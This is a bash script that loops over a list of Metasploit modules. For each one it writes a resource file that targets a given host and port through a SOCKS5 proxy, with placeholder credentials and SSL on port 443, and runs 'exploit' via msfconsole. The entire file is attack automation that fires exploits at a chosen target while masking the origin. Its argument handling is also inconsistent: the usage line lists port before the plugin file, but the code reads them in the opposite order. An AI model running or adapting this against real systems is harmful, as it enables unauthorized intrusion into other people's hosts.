#!/usr/local/bin/bash 


file="meterpreter.rc"


if [ $# -lt 3 ];then
echo "Usage $0 hostname port pluginfile"
exit 0
fi

host=$1
ip=$(host $host | grep -i "has address" |  awk ' { print $NF } ' | tr -d '\n')
plugins=$2
port=$3
>$file
for plugin in $(cat $plugins)
do
        >$file
        echo "use $plugin"      >> $file
        echo 'set Proxies socks5:192.168.100.3:9100' >> $file
        echo 'set ReverseAllowProxy true' >> $file
        echo "set RHOST $ip" >> $file
        echo "set RHOSTS $ip" >> $file
        echo "set VHOST $host" >> $file
        echo "set RPORT $port" >> $file
        echo "set USERNAME username" >> $file 
        echo "set PASSWORD sdlkashd" >> $file
        if [ $port == "443" ];
        then
        echo 'set SSL true' >> $file
        fi
        echo 'set ExitOnSession true' >> $file
        echo 'exploit' >> $file
        echo 'exit' >> $file

        msfconsole -r  /root/scripts/$file

done


